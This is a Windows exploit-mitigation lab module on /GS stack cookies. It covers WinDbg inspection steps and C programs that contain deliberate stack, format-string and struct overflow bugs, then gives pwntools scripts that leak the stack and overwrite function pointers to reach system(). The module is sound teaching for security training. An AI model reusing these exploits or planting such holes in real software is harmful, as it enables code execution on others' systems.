## Day 2: Stack Protection Mechanisms

- **Goal**: Understand stack cookies, SEHOP, and other stack-based protections.
- **Activities**:
  - _Reading_:
    - [Stack Cookies in Visual C++](https://learn.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check)
    - [SEHOP Overview](https://msrc.microsoft.com/blog/2009/02/preventing-the-exploitation-of-structured-exception-handler-seh-overwrites-with-sehop/)
  - _Online Resources_:
    - [Defeating Buffer Overflow Protection](https://www.blackhat.com/presentations/bh-asia-03/bh-asia-03-litchfield.pdf)
    - [SEH overwrite and its exploitability](https://www.ffri.jp/assets/files/research/research_papers/SEH_Overwrite_CanSecWest2010.pdf)
  - _Tool Setup_:
    - Visual Studio with /GS
    - WinDbg for stack inspection
  - _Exercise_:
    - Trigger stack cookie check
    - Test SEH overwrite protection
    - Verify SEHOP prevents exploit

### Stack Cookies (/GS)

**What are Stack Cookies?**:

- Random value placed before return address
- Checked before function returns
- Detects stack buffer overflows
- Terminates process if corrupted

**How They Work**:

```c
// Without /GS
void function(char *input) {
    char buffer[64];
    strcpy(buffer, input);
}

// Stack layout:
// [buffer][saved EBP][return address]
// Overflow: overwrites return address directly

// With /GS
void function(char *input) {
    char buffer[64];
    __int64 cookie = __security_cookie;  // Inserted by compiler
    strcpy(buffer, input);
    if (cookie != __security_cookie) {
        __security_check_cookie(cookie);  // Terminates!
    }
}

// Stack layout:
// [buffer][cookie][saved EBP][return address]
// Overflow: must overwrite cookie to reach return address
```

**Cookie Generation**:

```c
// __security_cookie is initialized at process startup
// Based on:
// - Current time (GetSystemTimeAsFileTime)
// - Process ID
// - Thread ID
// - Performance counter
// - Stack address

// Result: 32-bit or 64-bit random value
```

**Cookie Check**:

```asm
; Function prologue (x86)
push ebp
mov ebp, esp
sub esp, 0x44           ; Allocate locals
mov eax, ___security_cookie
xor eax, ebp            ; XOR with frame pointer
mov [ebp-0x04], eax     ; Store on stack

; Function body...

; Function epilogue
mov ecx, [ebp-0x04]     ; Load cookie
xor ecx, ebp            ; XOR with frame pointer
call @__security_check_cookie@4  ; Check
mov esp, ebp
pop ebp
ret
```

**Testing Stack Cookies**:

```c
// src\stack_overflow.c
#include <string.h>
#include <stdio.h>

void vulnerable(char *input) {
    char buffer[64];

    printf("[*] Entering vulnerable()\n");
    printf("[*] Buffer at: %p\n", buffer);
    printf("[*] Copying %zu bytes\n", strlen(input));
    fflush(stdout);  // Ensure output before potential crash

    strcpy(buffer, input);

    printf("[*] Copy complete\n");
    printf("[*] Returning from vulnerable()...\n");
    fflush(stdout);
}

int main(int argc, char **argv) {
    printf("[+] Program started\n");
    if (argc > 1) {
        vulnerable(argv[1]);
        printf("[+] Returned from vulnerable() successfully!\n");
    }
    printf("[+] Program ending normally\n");
    return 0;
}
```

**Compile Without /GS**:

```bash
# Save the source code to the lab src directory
cl /GS- /Zi /D_CRT_SECURE_NO_WARNINGS src\stack_overflow.c /Fe:bin\stack_overflow_no_gs.exe /link /DEBUG /NXCOMPAT:NO /DYNAMICBASE:NO
# Test overflow
python -c "import subprocess; subprocess.run(['bin\\stack_overflow_no_gs.exe', 'A'*500])"
# [*] Copying 500 bytes
# <crash during strcpy - corrupted critical memory>
```

**Compile With /GS**:

```bash
# Compile with all mitigations (Day 1 standard setup)
cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\stack_overflow.c /Fe:bin\stack_overflow.exe /link /DEBUG /NXCOMPAT /DYNAMICBASE

# Test overflow
python -c "import subprocess; subprocess.run(['bin\\stack_overflow.exe', 'A'*500])"
# [*] Copying 500 bytes
# [*] Copy complete
# [*] Returning from vulnerable()...
# <security cookie check failed - controlled termination>
```

**Viewing in WinDbg**:

```bash
# Launch with overflow argument (use 500 bytes to trigger detection
# cmd: bin\stack_overflow.exe
# arg: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```bash
# might need a `g` to start it based on your setup
# Set breakpoint at vulnerable function
bp stack_overflow!vulnerable
# bp stack_overflow_no_gs!vulnerable for the other one
g

# check for __security_check_cookie near ret
uf .
```

#### Deep Dive: WinDbg Stack Cookie Analysis

**Lab: Complete Stack Cookie Investigation**:

```bash
# Step 1: Examine the global security cookie
# Find the security cookie (might need to hit `g` first to initialize)
x stack_overflow!__security_cookie
# Example: 00007ff6`5056b140 stack_overflow!__security_cookie = 0x00004336`aa6df55d

# Step 2: Set breakpoint at function entry and step past prologue
bp stack_overflow!vulnerable
g

# PRO-TIP: By default, 't' steps one SOURCE LINE.
# One 't' will likely execute the entire prologue.
# Look at the disassembly ('u .') to ensure you are still in vulnerable()
# but past the 'mov [rsp+60h], rax' instruction.
t

# If you want to step instruction-by-instruction regardless of source:
# Use 't' after running: l- t
# (l- t disables source mode stepping)

# Step 3: Examine stack frame with cookie
# Ensure you are still in vulnerable()! If you see 'printf', you stepped too far.
r rsp
# Example: rsp=000000b2e68ff8b0
dq rsp+60 L1
# Example: 000000b2`e68ff910  00004384`4ce20ded

# Step 4: Understand the XOR operation
# IMPORTANT: In WinDbg expressions, symbols evaluate to their ADDRESS.
# Use poi() to get the VALUE stored at that address.
? poi(stack_overflow!__security_cookie) ^ rsp
# Example Evaluate expression: 00004384`4ce20ded

# The result of this MUST match the value you saw with 'dq' on the stack.

# Step 5: Watch the epilogue check
# Set a breakpoint near the end of vulnerable()
uf .
# Example: bp stack_overflow!vulnerable+0xaf
g

# Triggering the failure:
# (2924.7d4): Security check failure or stack buffer overrun - code c0000409
# Subcode: 0x2 FAST_FAIL_STACK_COOKIE_CHECK_FAILURE
# stack_overflow!__report_gsfailure+0x5:
# 00007ff6`504d7945 cd29            int     29h
```

**Variable Reordering by /GS**:

The compiler reorders local variables so that "buffers" (arrays) are placed at higher addresses, closer to the security cookie. This prevents an overflow from overwriting other local variables (like function pointers or class objects) before hitting the cookie.

**Source Code**:

```c
// src\var_reorder.c
#include <stdio.h>
#include <string.h>

// Force GS check even for small/unused buffers
#pragma strict_gs_check(on)

void test_reordering() {
    int count = 0x11111111;
    char buffer[16];
    void* ptr = (void*)0x4444444444444444;

    // Use the variables to prevent optimization
    sprintf(buffer, "Value: %d", count);
    printf("[*] Buffer: %s, Ptr: %p\n", buffer, ptr);
}

int main() {
    test_reordering();
    return 0;
}
```

**Viewing Variable Reordering in WinDbg**:

**Compile with /GS and debug info**:

```bash
# Save the test code to C:\Windows_Mitigations_Lab\src\var_reorder.c
cl /GS /Zi src\var_reorder.c /Fe:bin\var_reorder.exe /link /NXCOMPAT /DYNAMICBASE

windbg C:\Windows_Mitigations_Lab\bin\var_reorder.exe
bp var_reorder!test_reordering
g

# View local variable layout
dv /V
# Expected Output:
# @rsp+0x0030    buffer = char [16] "..."
# @rsp+0x0028       ptr = 0x...
# @rsp+0x0020     count = 0x...

# Notice: buffer has the HIGHEST offset (+30) among data variables.

# Or examine disassembly
uf var_reorder!test_reordering

# Proving Protection Layout:
# 1. Cookie is stored at [rsp+40h]
# 2. Buffer starts at  [rsp+30h]
# 3. Buffer ends at    [rsp+30h] + 16 bytes = [rsp+40h] (Exactly hitting the cookie!)

# If the compiler didn't reorder, buffer might be at [rsp+20h].
# An overflow of 16 bytes would overwrite 'count' and 'ptr'
# potentially giving control of execution BEFORE the cookie is even checked.
```

### Stack Cookie Bypass Techniques

Understanding how to bypass stack cookies is essential for both offensive security research
and building more robust defenses. Here we cover the primary bypass techniques.

#### Technique 1: Information Leak (Cookie Disclosure)

On Windows 11 with Intel CET enabled, even if you successfully leak and reconstruct the stack cookie, overwriting the return address will still be caught by the hardware shadow stack.
The shadow stack maintains a separate, protected copy of return addresses that the attacker cannot modify.
This technique demonstrates the **cookie leak and data-only attack** approach:

1. Use a format string bug to leak the XOR'd cookie from the stack
2. Instead of hijacking the return address (blocked by CET), corrupt a **function pointer** or **critical variable** that is used BEFORE the function returns
   This is the modern reality: cookie bypass alone is no longer sufficient for RIP control on CET-enabled systems. Data-only attacks are the way forward.

**Vulnerable Server Code (Windows)**:

```c
// vulnerable_server.c
// Demonstrates: format string leak + data-only attack via function pointer
// The server has TWO bugs:
//   1. Format string in Stage 1 (leak primitive)
//   2. Stack buffer overflow in Stage 2 (write primitive)
//
// KEY INSIGHT: /GS reorders local variables so arrays sit closest to the
// cookie, making it impossible to overflow from a stack array into a separate
// local function pointer. To defeat this, we use a STRUCT: the C standard
// guarantees struct member layout order, and /GS does NOT reorder members
// within a struct. By placing the buffer and handler in the same struct,
// overflowing req.data directly overwrites req.handler.
//
// This also sidesteps CET shadow stacks since no return address is used.

#include <winsock2.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 9999
#define DATA_SIZE 128

// Two handler functions - attacker wants to redirect to dangerous_handler
void safe_handler(const char* msg) {
    printf("[SAFE] Echoing: %s\n", msg);
}

void dangerous_handler(const char* msg) {
    printf("[DANGER] Executing: %s\n", msg);
    system(msg);  // RCE if attacker controls msg!
}

typedef void (*handler_t)(const char*);

// /GS does NOT reorder struct members - C standard guarantees layout order.
// Overflowing 'data' (128 bytes) directly overwrites 'handler' at offset 128.
struct request {
    char data[DATA_SIZE];   // offset 0   - overflow source
    handler_t handler;      // offset 128 - overflow target
    int status;             // offset 136
};

void handle_client(SOCKET client_sock) {
    // Stage 1 uses a separate buffer for the format string leak.
    // Stage 2 uses a struct to bypass /GS variable reordering.
    //
    // Why a struct? /GS reorders LOCAL variables so arrays are placed at
    // the highest stack addresses (closest to the cookie). This means a
    // plain "char buffer[128]" local will be ABOVE a "handler_t handler"
    // local - overflow goes UP toward the cookie, AWAY from handler.
    //
    // But /GS cannot reorder struct members (C standard §6.7.2.1 guarantees
    // order). In struct request, 'data' is at offset 0 and 'handler' is at
    // offset 128. Overflow of data[128] goes directly into handler.
    //
    // Stack layout (high to low):
    //   [return address]           <- protected by CET shadow stack
    //   [saved RBP]
    //   [GS cookie (XOR'd)]       <- /GS protection
    //   [leak_buf - 128 bytes]    <- /GS pushes arrays up
    //   [req.status]              <- struct is one unit, below arrays
    //   [req.handler]             <- TARGET at req + 128
    //   [req.data - 128 bytes]    <- overflow source at req + 0
    //   [response - 2048 bytes]   <- format string output
    //   [bytes_recv, etc.]        <- other scalars

    char leak_buf[128];         // Separate buffer for Stage 1 format string
    char response[2048];        // Large enough for format string expansion
    int bytes_recv;
    struct request req;         // Struct layout is NOT reordered by /GS

    req.handler = safe_handler;
    req.status = 0;
    memset(req.data, 0, DATA_SIZE);

    // ---- Stage 1: Format String Leak ----
    // Bug: snprintf(response, ..., leak_buf) uses attacker-controlled format
    // We use snprintf with a safe output size to avoid crashing here.
    // The VULNERABILITY is that the format string itself is attacker-controlled,
    // which leaks stack values via %p specifiers.
    bytes_recv = recv(client_sock, leak_buf, sizeof(leak_buf) - 1, 0);
    if (bytes_recv <= 0) return;
    leak_buf[bytes_recv] = '\0';

    printf("[*] Stage 1: Processing format string (leak)...\n");
    printf("[*] req.data    @ %p\n", req.data);
    printf("[*] req.handler @ %p -> %p\n", &req.handler, (void*)req.handler);
    printf("[*] offsetof(handler) = %zu bytes from req.data\n",
           (char*)&req.handler - req.data);
    fflush(stdout);

    // VULNERABILITY 1: Format string bug - leaks stack values
    // snprintf prevents output buffer overflow, but attacker controls the format
    _snprintf(response, sizeof(response) - 1, leak_buf);
    response[sizeof(response) - 1] = '\0';
    send(client_sock, response, (int)strlen(response), 0);

    // ---- Stage 2: Overflow -> Function Pointer Corruption ----
    // Bug: recv reads up to 1024 bytes into req.data which is only 128 bytes.
    // Bytes 128+ overwrite req.handler (the function pointer).
    printf("[*] Stage 2: Waiting for overflow payload...\n");
    fflush(stdout);
    bytes_recv = recv(client_sock, req.data, 1024, 0);
    if (bytes_recv <= 0) return;

    printf("[*] Received %d bytes (buffer is %d)\n", bytes_recv, DATA_SIZE);
    printf("[*] req.handler now points to: %p\n", (void*)req.handler);
    fflush(stdout);

    // The handler is called BEFORE function return (before cookie check!)
    // If overflow corrupted it, this calls the attacker's target.
    printf("[*] Calling handler...\n");
    fflush(stdout);
    req.handler(req.data);  // <-- Data-only attack: struct member, not return addr
    // CET doesn't protect this because it's an indirect CALL, not a RET.
    // (CFG would catch this - but we compiled without /guard:cf for this demo)

    printf("[*] Handler returned, function epilogue next...\n");
    fflush(stdout);
    // Cookie check happens HERE at function return.
    // If we overflowed past the cookie, process dies NOW - but handler already ran!
}

int main() {
    WSADATA wsa;
    SOCKET server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    int client_len = sizeof(client_addr);

    WSAStartup(MAKEWORD(2, 2), &wsa);

    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    listen(server_sock, 5);

    printf("Server listening on port %d...\n", PORT);
    printf("safe_handler      @ %p\n", safe_handler);
    printf("dangerous_handler @ %p\n", dangerous_handler);
    fflush(stdout);

    while (1) {
        client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &client_len);
        printf("\nClient connected!\n");
        fflush(stdout);
        handle_client(client_sock);
        closesocket(client_sock);
        printf("[*] Connection closed (server stays alive for next client)\n");
        fflush(stdout);
    }

    closesocket(server_sock);
    WSACleanup();
    return 0;
}
```

**Compile**:

```bash
# Save source to C:\Windows_Mitigations_Lab\src\vulnerable_server.c
cd C:\Windows_Mitigations_Lab

# Compile WITH /GS but WITHOUT CFG (to isolate cookie bypass)
# /guard:cf is intentionally omitted - CFG would block the indirect call
# /DYNAMICBASE:NO /FIXED makes addresses predictable for learning
cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\vulnerable_server.c ^
   /Fe:bin\vuln_server.exe /link ws2_32.lib /DEBUG ^
   /NXCOMPAT /DYNAMICBASE:NO /FIXED

# Also compile a CFG-protected version to show defense:
cl /GS /Zi /guard:cf /D_CRT_SECURE_NO_WARNINGS src\vulnerable_server.c ^
   /Fe:bin\vuln_server_cfg.exe /link ws2_32.lib /DEBUG ^
   /NXCOMPAT /DYNAMICBASE:NO /FIXED /guard:cf

# Verify mitigations:
dumpbin /headers bin\vuln_server.exe | findstr "NX Guard"
# Expected: NX compatible  (no Guard CF)
dumpbin /headers bin\vuln_server_cfg.exe | findstr "NX Guard"
# Expected: NX compatible + Control Flow Guard
```

**Pwntools Exploit - Cookie Leak + Data-Only Attack**:

```python
#!/usr/bin/env python3
"""
exploits/sc_1.py
Stack Cookie Bypass via Format String Leak + Function Pointer Overwrite

This exploit demonstrates a DATA-ONLY attack that works even on Windows 11
with CET (shadow stacks) enabled, because it never hijacks a return address.

Attack flow:
  Stage 1: Format string leak to dump stack values (find layout info)
  Stage 2: Overflow struct buffer to overwrite adjacent function pointer
           The handler is called BEFORE the function epilogue cookie check.

Why this works despite /GS:
  /GS reorders LOCAL variables so arrays are near the cookie. But it does NOT
  reorder STRUCT MEMBERS (C standard guarantees layout). Our struct places
  data[128] at offset 0 and handler at offset 128. Overflow of data directly
  overwrites handler regardless of /GS reordering of the struct as a whole.

What this bypasses:
  - /GS stack cookies (handler called before cookie check at function return)
  - /GS variable reordering (struct members maintain declared order)
  - CET shadow stacks (no return address corruption - indirect CALL, not RET)
  - DEP (no shellcode, reuses existing code)

What would block this:
  - CFG (/guard:cf) - validates indirect call targets against bitmap

Usage:
  1. Start server:  bin\\vuln_server.exe
  2. Run exploit:   python exploits\\sc_1.py
  3. With offsets:   python exploits\\sc_1.py --exploit
"""

from pwn import *
import time
import sys
import re

# Configuration
HOST = "127.0.0.1"
PORT = 9999

context.arch = 'amd64'
context.os = 'windows'
context.log_level = 'info'


def leak_stack_values(r):
    """
    Stage 1: Use format string bug to leak stack values.

    On Windows x64, MSVCRT %p prints bare hex WITHOUT '0x' prefix:
      e.g., "000000000014FA48" not "0x000000000014FA48"
    This is different from glibc which prints "0x14fa48".

    We dump values to find:
      - The handler function pointer (points to safe_handler)
      - Stack/code pointers for orientation
      - Cookie candidates for analysis
    """
    log.info("Stage 1: Leaking stack values via format string")

    # Use fewer specifiers to keep output within bounds.
    # Each %p on MSVCRT outputs 16 hex chars. With '.' separator:
    # 20 * (16 + 1) = 340 bytes — safely within response[2048].
    payload = b"%p." * 20
    r.send(payload)

    time.sleep(1.0)

    try:
        response = r.recv(8192, timeout=5)
    except EOFError:
        log.error("Connection closed before receiving leak response")
        log.error("The server may have crashed during sprintf.")
        log.error("Check server console for error messages.")
        return None

    if not response:
        log.error("Empty response - server may have crashed")
        return None

    log.info(f"Received {len(response)} bytes")
    log.info(f"Raw: {response[:200]}")

    # Parse leaked values - handle BOTH MSVCRT and glibc %p formats:
    #   MSVCRT:  "000000000014FA48" (bare 16-char hex, uppercase)
    #   glibc:   "0x14fa48"         (0x prefix, lowercase)
    #   Either:  "(nil)" or "00000000"  (null)
    leaks = []
    for part in response.split(b'.'):
        part = part.strip()
        if not part:
            continue
        try:
            decoded = part.decode('ascii', errors='ignore').strip()
            if not decoded:
                continue

            if decoded.lower() == '(nil)':
                leaks.append(0)
            elif decoded.startswith('0x') or decoded.startswith('0X'):
                # glibc-style: "0x7fff12345678"
                leaks.append(int(decoded, 16))
            elif re.match(r'^[0-9A-Fa-f]+$', decoded) and len(decoded) >= 8:
                # MSVCRT-style: "000000000014FA48" (bare hex, 8-16 chars)
                leaks.append(int(decoded, 16))
            else:
                continue
        except (ValueError, TypeError):
            continue

    if not leaks:
        log.error("No values parsed from format string output!")
        log.error("Raw response was: %s", response)
        return None

    # Display all leaked values with analysis
    log.info(f"Parsed {len(leaks)} values:")
    print(f"\n{'Idx':>4} {'Value':>20} {'Analysis'}")
    print("-" * 65)

    for i, val in enumerate(leaks):
        analysis = ""
        if val == 0:
            analysis = "NULL"
        elif val < 0x10000:
            analysis = "small value / size / flags"
        elif 0x0000000140000000 <= val <= 0x000000014FFFFFFF:
            analysis = "<-- EXE code pointer (check if safe/dangerous_handler)"
        elif 0x00007FF000000000 <= val <= 0x00007FFFFFFFFFFF:
            analysis = "DLL code pointer (ntdll/kernel32/etc)"
        elif 0x0000000000010000 <= val <= 0x00000000FFFFFFFF:
            analysis = "stack/low pointer"
        elif val > 0x100000000:
            # High entropy, not obviously a pointer - could be cookie
            analysis = "** COOKIE CANDIDATE ** (high entropy)"
        print(f"[{i:3d}] 0x{val:016X}  {analysis}")

    print()
    return leaks


def exploit():
    """
    Discovery phase:
    1. Leak stack values to understand layout
    2. Send cyclic pattern to find offset to handler
    """
    log.info(f"Target: {HOST}:{PORT}")
    log.info("")
    log.info("DISCOVERY PHASE")
    log.info("===============")
    log.info("Step 1: Leak stack values via format string")
    log.info("Step 2: Send cyclic pattern to find handler offset")
    log.info("")

    # ---- Stage 1: Leak ----
    r = remote(HOST, PORT)
    leaks = leak_stack_values(r)
    if not leaks:
        r.close()
        return

    # ---- Stage 2: Cyclic pattern to find handler offset ----
    # struct request { char data[128]; handler_t handler; int status; };
    # In theory, handler is at data+128. But let's verify empirically
    # in case of padding or compiler alignment.
    log.info("Stage 2: Sending cyclic pattern to find handler offset")
    log.info("Watch the server console for: 'req.handler now points to: XXXXXXXX'")
    log.info("Then use cyclic_find() with that value to get the exact offset.")

    pattern = cyclic(512)
    time.sleep(0.5)
    r.send(pattern)

    time.sleep(1)
    r.close()

    log.info("")
    log.info("=" * 60)
    log.info("NEXT STEPS:")
    log.info("=" * 60)
    log.info("1. Read the server output for dangerous_handler address")
    log.info("   e.g.: dangerous_handler @ 00000001400043BD")
    log.info("")
    log.info("2. Read the corrupted handler value from server output")
    log.info("   e.g.: req.handler now points to: 6261617462616173")
    log.info("")
    log.info("3. Find offset:")
    log.info("   python -c \"from pwn import *; print(cyclic_find(0x<value>))\"")
    log.info("   (expected: 128 for struct request with data[128])")
    log.info("")
    log.info("4. Update HANDLER_OFFSET and DANGEROUS_HANDLER in this script")
    log.info("5. Run: python exploits\\sc_1.py --exploit")
    log.info("=" * 60)


def exploit_with_known_offset():
    """
    Exploitation phase (after discovery).
    Uses known offset and address to overwrite the handler.

    The struct layout guarantees:
      req.data    @ offset 0    (128 bytes)
      req.handler @ offset 128  (8 bytes on x64)
      req.status  @ offset 136  (4 bytes)

    So HANDLER_OFFSET should be 128 (= sizeof(data)).
    """
    # ===== UPDATE THESE VALUES FOR YOUR BUILD =====
    HANDLER_OFFSET = 128                  # offsetof(struct request, handler)
    DANGEROUS_HANDLER = 0x1400043BD       # from server output / dumpbin
    # ================================================

    log.info(f"Exploiting: offset={HANDLER_OFFSET}, target=0x{DANGEROUS_HANDLER:X}")

    r = remote(HOST, PORT)

    # Stage 1: Send benign string (we don't need the leak for exploitation)
    r.send(b"hello_from_exploit")
    time.sleep(0.5)
    try:
        r.recv(4096, timeout=3)  # Consume the leak response
    except EOFError:
        pass

    # Stage 2: Targeted overflow
    # req.data[0..] is passed as argument to req.handler(req.data).
    # If handler = dangerous_handler, it calls system(req.data).
    # So put the command string at the START of data, pad to offset, then address.
    #
    # NOTE: system() stops at null byte, so we null-terminate the command
    # and use 'A' padding after. The padding bytes are safely ignored by system().

    command = b"calc.exe\x00"                           # 9 bytes (with null)
    padding = b"B" * (HANDLER_OFFSET - len(command))    # pad to offset 128
    handler_addr = p64(DANGEROUS_HANDLER)               # 8 bytes, little-endian

    payload = command + padding + handler_addr

    log.info(f"Payload layout ({len(payload)} bytes):")
    log.info(f"  [0..{len(command)-1}]   command: {command}")
    log.info(f"  [{len(command)}..{HANDLER_OFFSET-1}] padding: {len(padding)} bytes")
    log.info(f"  [{HANDLER_OFFSET}..{HANDLER_OFFSET+7}] handler: 0x{DANGEROUS_HANDLER:X}")

    time.sleep(0.5)
    r.send(payload)

    time.sleep(2)
    r.close()

    log.success("Exploit sent!")
    log.success("Check the server console for:")
    log.success("  [DANGER] Executing: calc.exe")
    log.success("  (calc.exe should open!)")
    log.info("")
    log.info("The server process will then crash with 0xC0000409 (/GS cookie)")
    log.info("because the overflow ALSO corrupted the cookie. But the handler")
    log.info("already executed — the damage is done BEFORE /GS checks!")
    log.info("")
    log.info("To test CFG: run against vuln_server_cfg.exe instead.")
    log.info("NOTE: CFG is coarse-grained — dangerous_handler IS a valid function")
    log.info("entry, so CFG will ALLOW this redirect. CFG only blocks calls to")
    log.info("mid-function addresses, shellcode, or ROP gadgets.")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--exploit":
        exploit_with_known_offset()
    else:
        exploit()
```

**Running the Exploit**:

```bash
# Terminal 1: Start the server
cd C:\Windows_Mitigations_Lab
.\bin\vuln_server.exe
# Output:
#   Server listening on port 9999...
#   safe_handler      @ 0000000140001F8C
#   dangerous_handler @ 00000001400043BD

# Terminal 2: Discovery phase
python exploits\sc_1.py
# This leaks stack values and sends a cyclic pattern.
# Check server output for:
#   req.handler now points to: 6261616962616168
# Then find offset:
#   python -c "from pwn import *; print(cyclic_find(0x6261616962616168))"
#   -> 128  (confirms handler is at data + 128, as expected from struct layout)

# Terminal 2: Update DANGEROUS_HANDLER in script with server's address, then:
python exploits\sc_1.py --exploit
# Server should print: [DANGER] Executing: calc.exe
# calc.exe opens, then server crashes (cookie check)
```

#### Technique 2: Partial Overwrite (LSB Overwrite)

Corrupt only the low byte(s) of a function pointer within a struct, redirecting execution
to a nearby function without needing a full 8-byte address write. This works because
functions in the same binary share upper address bytes when ASLR is off (`/FIXED`).

> [!NOTE]
> **Why partial overwrite?** In some scenarios, you can only corrupt a limited number of
> bytes past the buffer boundary (e.g., off-by-one, or the overflow is length-limited).
> If the target function pointer shares its upper bytes with the desired target (common
> in the same module without ASLR), overwriting just 1-2 bytes is enough.
>
> **CET compatibility**: Like Technique 1, this targets a struct member function pointer
> (indirect CALL), not the return address. CET shadow stacks don't block it.

**Vulnerable Code**:

```c
// partial_overwrite.c
// Demonstrates: off-by-N overflow within a struct that partially corrupts
// a function pointer, redirecting to a different function in the same module.
//
// Key insight: Without ASLR (/FIXED), all functions in the EXE share the
// same upper bytes (e.g., 0x00000001400XXXXX). Only the lower bytes differ.
// An overflow that corrupts just the low 1-2 bytes of a function pointer
// can redirect to any function within a 256-byte (1 byte) or 64KB (2 byte) range.

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef void (*action_t)(const char*);

void log_message(const char* msg) {
    printf("[LOG] %s\n", msg);
}

void exec_command(const char* msg) {
    printf("[EXEC] Running: %s\n", msg);
    system(msg);  // RCE!
}

// Struct layout is guaranteed by C standard - /GS cannot reorder members
struct packet {
    char name[32];      // offset 0   - small buffer
    action_t action;    // offset 32  - function pointer (our target)
    int priority;       // offset 40
};

void process_packet(struct packet *pkt) {
    printf("[*] Processing packet: name='%s'\n", pkt->name);
    printf("[*] Action ptr: %p\n", (void*)pkt->action);
    fflush(stdout);

    // Call the action handler - this is an indirect CALL (CET doesn't block)
    pkt->action(pkt->name);
}

int main() {
    struct packet pkt;
    pkt.action = log_message;
    pkt.priority = 0;

    printf("log_message  @ %p\n", (void*)log_message);
    printf("exec_command @ %p\n", (void*)exec_command);
    printf("Offset between: %lld bytes\n",
           (long long)((char*)exec_command - (char*)log_message));
    fflush(stdout);

    printf("\nEnter packet name (max 32 chars): ");
    fflush(stdout);

    // VULNERABILITY: reads up to 40 bytes into 32-byte name field
    // Off-by-8: can overwrite the low bytes of pkt.action
    // Using fread to handle binary data (fgets stops at newline)
    int n = (int)fread(pkt.name, 1, 40, stdin);
    if (n > 0) {
        // Don't null-terminate - we want to preserve the partial overwrite bytes
        printf("[*] Read %d bytes\n", n);
        fflush(stdout);
    }

    process_packet(&pkt);
    return 0;
}
```

**Compile**:

```bash
# Save to C:\Windows_Mitigations_Lab\src\partial_overwrite.c
cd C:\Windows_Mitigations_Lab

# WITHOUT /GS, no ASLR (/FIXED) - isolate the partial overwrite
cl /GS- /Zi /D_CRT_SECURE_NO_WARNINGS src\partial_overwrite.c ^
   /Fe:bin\partial_overwrite.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

# WITH /GS - show that /GS doesn't help (struct members aren't reordered)
cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\partial_overwrite.c ^
   /Fe:bin\partial_overwrite_gs.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

```

**Pwntools - Partial Overwrite**:

```python
#!/usr/bin/env python3
"""
exploits/sc_2_partial.py
Partial Overwrite Bypass - Corrupt low bytes of struct function pointer.

When the overflow is limited (off-by-N), we can only corrupt the low
byte(s) of the function pointer. Since log_message and exec_command are
in the same binary and ASLR is off, they share upper address bytes.

Works on Windows 11 + CET: targets struct member (indirect CALL, not RET).
NOT blocked by coarse-grained CFG (target is a valid function entry).
Blocked by: ASLR (randomizes upper bytes), fine-grained CFI.

Usage:
  python exploits\\sc_2_partial.py            # Discovery
  python exploits\\sc_2_partial.py --exploit   # Exploitation
"""

from pwn import *
import re
import sys

context.arch = 'amd64'
context.os = 'windows'
context.log_level = 'info'


def parse_address(output_bytes, label):
    """
    Parse a function address from the binary's output.
    Handles MSVCRT bare-hex format (e.g., 0000000140001F96)
    and glibc 0x-prefixed format.
    """
    decoded = output_bytes.decode(errors='replace')
    # Match: "label  @ 0000000140001F96" or "label @ 0x140001F96"
    pattern = rf'{re.escape(label)}\s+@\s+(0x)?([0-9A-Fa-f]+)'
    m = re.search(pattern, decoded)
    if m:
        return int(m.group(2), 16)
    return None


def discover():
    """
    Run the binary to see function addresses and compute the
    partial overwrite byte(s) needed. Auto-parses addresses.
    """
    binary_path = r'C:\Windows_Mitigations_Lab\bin\partial_overwrite.exe'

    log.info("Discovery: running binary to get function addresses")
    p = process([binary_path])

    output = b""
    try:
        output = p.recvuntil(b"Enter packet name", timeout=5)
    except:
        pass

    log.info(f"Output:\n{output.decode(errors='replace')}")

    p.sendline(b"test")
    try:
        rest = p.recvall(timeout=3)
        log.info(f"Rest:\n{rest.decode(errors='replace')}")
    except:
        pass
    p.close()

    # Auto-parse addresses
    log_addr = parse_address(output, 'log_message')
    exec_addr = parse_address(output, 'exec_command')

    if log_addr and exec_addr:
        log.success(f"log_message  = 0x{log_addr:016X}")
        log.success(f"exec_command = 0x{exec_addr:016X}")

        # Determine how many low bytes differ
        xor = log_addr ^ exec_addr
        n_bytes = (xor.bit_length() + 7) // 8
        log.info(f"Addresses differ in lowest {n_bytes} byte(s)")

        low_bytes = (exec_addr & ((1 << (n_bytes * 8)) - 1)).to_bytes(n_bytes, 'little')
        log.info(f"Low bytes to overwrite (LE): {low_bytes.hex()}")
        log.info(f"")
        log.info(f"Run exploit: python exploits\\sc_2_partial.py --exploit")
    else:
        log.error("Could not parse addresses from output")


def exploit():
    """
    Partial overwrite of function pointer's low byte(s).

    struct packet layout:
      +0x00: name[32]   (32 bytes)
      +0x20: action      (8 bytes, function pointer)
      +0x28: priority    (4 bytes)

